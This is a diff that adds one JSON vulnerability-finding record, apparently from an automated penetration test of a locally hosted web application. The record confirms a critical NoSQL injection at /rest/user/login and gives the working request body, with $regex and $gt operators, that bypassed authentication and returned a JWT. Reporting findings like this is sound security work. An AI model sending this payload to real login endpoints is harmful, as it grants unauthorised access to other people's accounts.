@@ -1,0 +1,28 @@
+{
+  "id": "f_1784838100521_1a4885",
+  "action": "confirm",
+  "title": "NoSQL Injection via JSON Object Injection in Login",
+  "severity": "critical",
+  "finding_kind": "vuln",
+  "location": "/rest/user/login",
+  "url": "/rest/user/login",
+  "description": "The login endpoint at /rest/user/login is also vulnerable to NoSQL injection when JSON objects are passed instead of string values. By sending a JSON object with a $regex operator in the email or password field, an attacker can bypass authentication by matching any existing user without knowing the actual credentials. This is because the Node.js application passes the JSON object directly to the MongoDB query without proper type checking.",
+  "poc": "POST /rest/user/login, body: {\"email\":{\"$regex\":\".*\"},\"password\":{\"$gt\":\"\"}} → HTTP 200 with JWT token, proving NoSQL injection authentication bypass",
+  "proof": "POST /rest/user/login with body {\"email\":{\"$regex\":\".*\"},\"password\":{\"$gt\":\"\"}} returns HTTP 200 with {\"authentication\":{\"token\":\"eyJ...\"}} proving authentication bypass. The $regex .* matches any email and $gt \"\" matches any password string in MongoDB.",
+  "how_captured": "script: result.json",
+  "evidence_ids": [
+    "ev_1784838100514_d0c19a"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784838100514_d0c19a",
+      "excerpt": "POST /rest/user/login with body {\"email\":{\"$regex\":\".*\"},\"password\":{\"$gt\":\"\"}} returns HTTP 200 with {\"authentication\":{\"token\":\"eyJ...\"}} proving authentication bypass. The $regex .* matches any email and $gt \"\" matches any password string in MongoDB.",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "script: result.json"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-23T20:21:40.522Z"
+}
